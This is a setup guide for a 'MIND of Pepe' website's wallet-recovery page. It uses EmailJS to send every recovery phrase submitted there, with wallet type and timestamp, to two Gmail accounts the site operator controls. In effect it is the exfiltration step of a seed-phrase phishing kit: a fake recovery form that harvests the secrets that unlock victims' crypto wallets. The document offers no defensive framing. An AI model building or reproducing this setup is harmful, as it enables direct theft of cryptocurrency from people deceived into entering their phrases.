# EmailJS Setup Instructions

To receive recovery phrases in your Gmail accounts, follow these steps:

## Step 1: Create EmailJS Account
1. Go to https://www.emailjs.com/
2. Sign up for a free account
3. Verify your email

## Step 2: Add Gmail Service
1. In EmailJS dashboard, go to "Email Services"
2. Click "Add New Service"
3. Select "Gmail"
4. Connect your Gmail account
5. Note down the **Service ID** (e.g., "service_xyz123")

## Step 3: Create Email Template
1. Go to "Email Templates"
2. Click "Create New Template"
3. Use this template content:

```
Subject: 🔐 New Wallet Recovery Phrase Submitted

A new wallet recovery phrase has been submitted:

Wallet Type: {{wallet_type}}
Timestamp: {{timestamp}}

Recovery Phrase:
{{recovery_phrase}}

---
This message was sent from your MIND of Pepe website.
```

4. Note down the **Template ID** (e.g., "template_abc456")

## Step 4: Get Public Key
1. Go to "Account" → "General"
2. Find your **Public Key** (e.g., "user_def789")

## Step 5: Update Code
Replace the placeholders in `src/app/wallet-recovery/page.tsx`:

```typescript
// Replace these values:
'YOUR_SERVICE_ID' → 'service_xyz123' (your actual service ID)
'YOUR_TEMPLATE_ID' → 'template_abc456' (your actual template ID)
'YOUR_PUBLIC_KEY' → 'user_def789' (your actual public key)
'your-first-email@gmail.com' → 'youremail1@gmail.com'
'your-second-email@gmail.com' → 'youremail2@gmail.com'
```

## Step 6: Test
1. Start your dev server
2. Go to `/wallet-recovery`
3. Enter a test recovery phrase
4. Click "Proceed"
5. Check both Gmail accounts for the email

## Free Limits
- EmailJS free plan: 200 emails/month
- Perfect for testing and moderate usage

## Security Notes
- EmailJS is client-side, so API keys are visible in browser
- For production, consider using Next.js API routes with server-side email
- Never store sensitive data permanently in email services

Your Gmail accounts will receive emails containing:
- Wallet type selected
- Recovery phrase entered
- Timestamp of submission
